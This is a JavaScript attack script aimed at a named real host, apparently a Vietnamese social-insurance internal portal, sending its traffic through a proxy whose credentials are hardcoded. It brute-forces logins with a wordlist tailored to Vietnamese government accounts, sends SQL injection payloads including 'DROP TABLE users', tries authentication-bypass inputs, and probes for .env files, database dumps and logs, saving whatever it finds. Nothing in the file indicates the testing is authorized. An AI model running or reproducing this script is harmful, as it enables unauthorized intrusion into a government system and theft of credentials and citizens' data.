const axios = require('axios');
const { HttpProxyAgent } = require('http-proxy-agent');
const fs = require('fs');

// Proxy configuration 
const proxyUrl = 'http://beba111:tDV5tkMchYUBMD@ip.mproxy.vn:12301';
const baseUrl = 'http://vssapp.teca.vn:8088';

console.log('⚡ ADVANCED BRUTE FORCE & BYPASS TECHNIQUES');
console.log('🎯 Target: VSS Internal Portal');
console.log('=' * 60);

// Tạo client với proxy
function createClient() {
  return axios.create({
    httpAgent: new HttpProxyAgent(proxyUrl),
    timeout: 10000,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
      'Connection': 'keep-alive'
    }
  });
}

// Lấy CSRF token
async function getCSRFToken(client) {
  const response = await client.get(`${baseUrl}/login`);
  const tokenMatch = response.data.match(/_token["\s]*value=["']([^"']+)["']/i);
  const csrfToken = tokenMatch ? tokenMatch[1] : null;
  
  // Lưu cookies
  const cookies = response.headers['set-cookie'];
  if (cookies) {
    const cookieHeader = cookies.map(c => c.split(';')[0]).join('; ');
    client.defaults.headers.Cookie = cookieHeader;
  }
  
  return csrfToken;
}

// Extended brute force với patterns Việt Nam
async function extendedBruteForce(client, csrfToken) {
  console.log('\n🚀 EXTENDED BRUTE FORCE');
  console.log('─'.repeat(50));
  
  const vietnameseCredentials = [
    // Dựa trên cơ quan VSS/BHXH Việt Nam
    { username: 'vssadmin', password: 'vss2023' },
    { username: 'bhxhadmin', password: 'bhxh2023' },
    { username: 'quantri', password: 'vss123' },
    { username: 'quanly', password: 'bhxh123' },
    { username: 'admin', password: 'vss2023' },
    { username: 'admin', password: 'bhxh2023' },
    
    // Patterns theo năm
    { username: 'admin', password: '2023' },
    { username: 'admin', password: '2024' },
    { username: 'admin', password: '2025' },
    { username: 'admin', password: 'admin2023' },
    { username: 'admin', password: 'admin2024' },
    
    // Patterns đơn giản Vietnamese
    { username: 'admin', password: '123456' },
    { username: 'admin', password: 'admin123' },
    { username: 'admin', password: 'password123' },
    { username: 'test', password: '123456' },
    { username: 'user', password: '123456' },
    
    // Specific to Vietnamese government systems
    { username: 'congchuc', password: 'congchuc123' },
    { username: 'nhanvien', password: 'nhanvien123' },
    { username: 'tienluong', password: 'tienluong123' },
    { username: 'baohiem', password: 'baohiem123' },
    
    // Mobile app related
    { username: 'mobile', password: 'mobile123' },
    { username: 'app', password: 'app123' },
    { username: 'teca', password: 'teca123' },
    { username: 'teca', password: 'password' },
    
    // Common IT usernames
    { username: 'it', password: 'it123' },
    { username: 'developer', password: 'dev123' },
    { username: 'support', password: 'support123' },
    { username: 'system', password: 'system123' }
  ];
  
  for (let i = 0; i < vietnameseCredentials.length; i++) {
    const cred = vietnameseCredentials[i];
    console.log(`\n🔑 [${i+1}/${vietnameseCredentials.length}] "${cred.username}" / "${cred.password}"`);
    
    try {
      const formData = new URLSearchParams();
      formData.append('_token', csrfToken);
      formData.append('username', cred.username);
      formData.append('password', cred.password);
      
      const response = await client.post(`${baseUrl}/login`, formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Referer': `${baseUrl}/login`,
          'Origin': baseUrl
        },
        maxRedirects: 5
      });
      
      // Kiểm tra chi tiết response
      const responseLength = response.data.length;
      const responseContent = response.data.toLowerCase();
      
      console.log(`   📊 Status: ${response.status}, Length: ${responseLength} chars`);
      
      // Pattern matching for success
      if (responseLength > 5000 || 
          responseContent.includes('dashboard') || 
          responseContent.includes('welcome') ||
          responseContent.includes('home') ||
          responseContent.includes('logout') ||
          responseContent.includes('profile') ||
          !responseContent.includes('đăng nhập')) {
        
        console.log('   🎉 POTENTIAL SUCCESS! Response khác thường!');
        
        // Lưu response để phân tích
        const filename = `/workspace/docs/success_${cred.username}_${Date.now()}.html`;
        fs.writeFileSync(filename, response.data);
        console.log(`   💾 Saved to: ${filename}`);
        
        return { success: true, credentials: cred, response: response.data };
      }
      
    } catch (error) {
      if (error.response?.status === 302) {
        const location = error.response.headers.location;
        console.log(`   🚀 Redirect: ${location}`);
        
        if (location && !location.includes('login')) {
          console.log('   🎯 POSSIBLE SUCCESS! Redirect không phải login page!');
          return { success: true, credentials: cred };
        }
      } else {
        console.log(`   ❌ Error: ${error.message}`);
      }
    }
    
    // Delay để tránh rate limiting
    await new Promise(resolve => setTimeout(resolve, 800));
  }
  
  return { success: false };
}

// SQL Injection attempts
async function sqlInjectionAttempts(client, csrfToken) {
  console.log('\n💉 SQL INJECTION ATTEMPTS');
  console.log('─'.repeat(50));
  
  const sqlPayloads = [
    { username: "admin'--", password: 'anything' },
    { username: "admin'/*", password: 'anything' },
    { username: "admin' or '1'='1'--", password: 'anything' },
    { username: "admin' or '1'='1'/*", password: 'anything' },
    { username: "' or 1=1--", password: 'anything' },
    { username: "' or 1=1#", password: 'anything' },
    { username: "admin", password: "' or '1'='1'--" },
    { username: "admin", password: "' or '1'='1'/*" },
    { username: "1' or '1'='1", password: "1' or '1'='1" },
    { username: "admin'; DROP TABLE users;--", password: 'test' }
  ];
  
  for (let i = 0; i < sqlPayloads.length; i++) {
    const payload = sqlPayloads[i];
    console.log(`\n💊 SQL Payload ${i+1}: "${payload.username}" / "${payload.password}"`);
    
    try {
      const formData = new URLSearchParams();
      formData.append('_token', csrfToken);
      formData.append('username', payload.username);
      formData.append('password', payload.password);
      
      const response = await client.post(`${baseUrl}/login`, formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Referer': `${baseUrl}/login`,
          'Origin': baseUrl
        },
        maxRedirects: 5
      });
      
      const responseLength = response.data.length;
      console.log(`   📊 Status: ${response.status}, Length: ${responseLength}`);
      
      // Check for SQL errors or different responses
      if (responseLength !== 3696 || 
          response.data.includes('error') || 
          response.data.includes('mysql') ||
          response.data.includes('sql') ||
          response.data.includes('database')) {
        
        console.log('   ⚠️ UNUSUAL RESPONSE! Possible SQL vulnerability!');
        
        // Save for analysis
        const filename = `/workspace/docs/sql_response_${i}_${Date.now()}.html`;
        fs.writeFileSync(filename, response.data);
        console.log(`   💾 Saved response: ${filename}`);
      }
      
    } catch (error) {
      console.log(`   ❌ Error: ${error.message}`);
      
      // SQL errors might indicate vulnerability
      if (error.message.includes('mysql') || 
          error.message.includes('sql') || 
          error.message.includes('database')) {
        console.log('   🔴 POTENTIAL SQL VULNERABILITY!');
      }
    }
    
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
}

// Authentication bypass attempts
async function authBypassAttempts(client, csrfToken) {
  console.log('\n🔓 AUTHENTICATION BYPASS ATTEMPTS');
  console.log('─'.repeat(50));
  
  const bypassAttempts = [
    // Parameter pollution
    { username: 'admin', password: 'wrong', extra: { username: 'admin', password: 'admin' } },
    
    // Array injection
    { username: ['admin'], password: ['admin'] },
    
    // Boolean bypass
    { username: 'admin', password: true },
    { username: true, password: 'admin' },
    
    // Empty/null bypass
    { username: '', password: '' },
    { username: null, password: null },
    
    // Special characters
    { username: 'admin\x00', password: 'admin' },
    { username: 'admin%00', password: 'admin' }
  ];
  
  for (let i = 0; i < bypassAttempts.length; i++) {
    const attempt = bypassAttempts[i];
    console.log(`\n🔓 Bypass ${i+1}: ${JSON.stringify(attempt)}`);
    
    try {
      const formData = new URLSearchParams();
      formData.append('_token', csrfToken);
      
      if (attempt.extra) {
        // Parameter pollution
        Object.keys(attempt.extra).forEach(key => {
          formData.append(key, attempt.extra[key]);
        });
      }
      
      formData.append('username', attempt.username);
      formData.append('password', attempt.password);
      
      const response = await client.post(`${baseUrl}/login`, formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Referer': `${baseUrl}/login`,
          'Origin': baseUrl
        }
      });
      
      console.log(`   📊 Status: ${response.status}, Length: ${response.data.length}`);
      
      if (response.data.length !== 3696) {
        console.log('   ⚠️ DIFFERENT RESPONSE LENGTH!');
        
        const filename = `/workspace/docs/bypass_${i}_${Date.now()}.html`;
        fs.writeFileSync(filename, response.data);
        console.log(`   💾 Saved: ${filename}`);
      }
      
    } catch (error) {
      console.log(`   ❌ Error: ${error.message}`);
    }
    
    await new Promise(resolve => setTimeout(resolve, 600));
  }
}

// Tìm kiếm config files và sensitive endpoints
async function searchSensitiveFiles(client) {
  console.log('\n🔍 SEARCHING FOR SENSITIVE FILES');
  console.log('─'.repeat(50));
  
  const sensitiveFiles = [
    '.env',
    '.env.backup',
    '.env.local',
    '.env.production',
    'config.php',
    'database.php',
    'app.php',
    'auth.php',
    'config/database.php',
    'config/app.php',
    'storage/logs/laravel.log',
    'backup.sql',
    'dump.sql',
    'users.sql',
    'phpinfo.php',
    'info.php',
    'test.php',
    'admin.php',
    'login.sql',
    'install.php',
    'setup.php'
  ];
  
  const foundFiles = [];
  
  for (let file of sensitiveFiles) {
    try {
      console.log(`   🔍 ${file}`);
      const response = await client.get(`${baseUrl}/${file}`);
      
      if (response.status === 200) {
        console.log(`   ✅ FOUND: ${file} (${response.data.length} chars)`);
        foundFiles.push({ file, content: response.data });
        
        // Save found files
        const filename = `/workspace/docs/found_${file.replace(/[\/\\]/g, '_')}_${Date.now()}.txt`;
        fs.writeFileSync(filename, response.data);
        console.log(`   💾 Saved: ${filename}`);
        
        // Check for credentials in content
        const content = response.data.toLowerCase();
        if (content.includes('password') || content.includes('username') || 
            content.includes('database') || content.includes('db_')) {
          console.log(`   🔑 CONTAINS POTENTIAL CREDENTIALS!`);
        }
      }
      
    } catch (error) {
      if (error.response?.status === 403) {
        console.log(`   🔒 FORBIDDEN: ${file} (exists but protected)`);
      }
      // Ignore 404s
    }
    
    await new Promise(resolve => setTimeout(resolve, 200));
  }
  
  return foundFiles;
}

// Main execution
async function main() {
  try {
    const client = createClient();
    
    // Step 1: Get CSRF token
    console.log('🔧 Getting CSRF token...');
    const csrfToken = await getCSRFToken(client);
    if (!csrfToken) {
      console.log('❌ Cannot get CSRF token');
      return;
    }
    console.log(`✅ CSRF Token: ${csrfToken.substring(0, 20)}...`);
    
    // Step 2: Extended brute force
    const bruteResult = await extendedBruteForce(client, csrfToken);
    if (bruteResult.success) {
      console.log('\n🎊 BRUTE FORCE SUCCESS!');
      console.log(`✅ Username: ${bruteResult.credentials.username}`);
      console.log(`✅ Password: ${bruteResult.credentials.password}`);
    }
    
    // Step 3: SQL Injection attempts
    await sqlInjectionAttempts(client, csrfToken);
    
    // Step 4: Auth bypass attempts  
    await authBypassAttempts(client, csrfToken);
    
    // Step 5: Search for sensitive files
    const foundFiles = await searchSensitiveFiles(client);
    
    // Summary
    console.log('\n📊 FINAL SUMMARY');
    console.log('=' * 60);
    console.log(`🔑 Brute force success: ${bruteResult.success ? 'YES' : 'NO'}`);
    console.log(`📁 Sensitive files found: ${foundFiles.length}`);
    
    if (foundFiles.length > 0) {
      console.log('📋 Found files:');
      foundFiles.forEach(f => console.log(`   - ${f.file}`));
    }
    
    console.log('\n🎯 ADVANCED ATTACK COMPLETED!');
    
  } catch (error) {
    console.error('💥 Fatal error:', error.message);
  }
}

main();